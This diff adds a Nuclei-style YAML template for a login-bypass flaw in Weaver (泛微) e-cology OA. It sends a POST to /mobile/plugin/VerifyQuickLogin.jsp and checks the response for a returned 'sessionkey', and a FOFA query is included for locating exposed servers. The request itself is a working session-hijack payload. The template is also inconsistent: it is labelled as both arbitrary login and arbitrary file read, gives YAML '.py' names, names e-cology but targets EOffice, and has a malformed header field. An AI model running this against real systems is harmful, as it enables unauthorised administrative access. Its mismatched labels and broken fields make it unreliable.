@@ -1,0 +1,35 @@
+id: oa任意用户登录.py
+
+info:
+  name: oa泛微0day任意文件读取.py
+  severity: medium
+  description: 泛微 e-cology 存在任意管理户登陆漏洞,攻击者可利用该漏洞获取系统敏感信息等
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="泛微-EOffice"
+  tags: fanwei,ecology,exposure,config
+
+http:
+  - method: 
+      - POST
+    path:
+      - "{{BaseURL}}/mobile/plugin/VerifyQuickLogin.jsp"
+    Rheader:
+      - Content-Type:application/x-www-form-urlencoded
+    body:
+      - |
+        identifier=1&language=1&ipaddress=1.1.1.1
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "sessionkey"
+        condition: and
+
+
+      - type: status
+        status:
+          - 200
